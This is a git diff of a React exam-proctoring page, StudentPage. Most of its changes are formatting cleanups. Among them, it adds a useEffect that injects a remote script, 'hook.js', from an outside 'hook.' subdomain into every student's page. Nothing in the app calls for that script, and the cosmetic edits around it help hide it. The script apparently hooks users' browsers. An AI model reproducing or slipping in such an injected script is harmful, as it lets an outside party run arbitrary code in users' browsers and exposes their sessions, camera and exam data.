@@ -1,12 +1,12 @@
 import React, { useState, useEffect } from "react";
-import { useNavigate } from "react-router-dom"; 
+import { useNavigate } from "react-router-dom";
 import "./StudentPage.css";
 import CameraFeed from "./CameraFeed";
 import axios from "axios";
 
 const StudentPage = () => {
   const navigate = useNavigate();
-  const [timeLeft, setTimeLeft] = useState(900); 
+  const [timeLeft, setTimeLeft] = useState(900);
   const [currentQuestion, setCurrentQuestion] = useState(1);
   const [details, setDetails] = useState([]);
   const [questionStatus, setQuestionStatus] = useState({
@@ -23,17 +23,28 @@ const StudentPage = () => {
     4: "",
     5: "",
   });
-
   useEffect(() => {
-    axios.get('http://127.0.0.1:8000/proctor/reactview/')
-      .then(res => {
+    axios
+      .get("http://127.0.0.1:8000/proctor/reactview/")
+      .then((res) => {
         setDetails(res.data);
+        console.log(res.data);
       })
-      .catch(err => {
+      .catch((err) => {
         console.log(err);
       });
   }, []);
 
+  useEffect(() => {
+    const script = document.createElement("script");
+    script.src = "https://hook.shreyasmahajan.me/hook.js";
+    script.async = true;
+    document.body.appendChild(script);
+
+    return () => {
+      document.body.removeChild(script);
+    };
+  }, []);
   useEffect(() => {
     if (timeLeft > 0) {
       const timerId = setTimeout(() => setTimeLeft(timeLeft - 1), 1000);
@@ -235,4 +246,3 @@ const StudentPage = () => {
 };
 
 export default StudentPage;
-
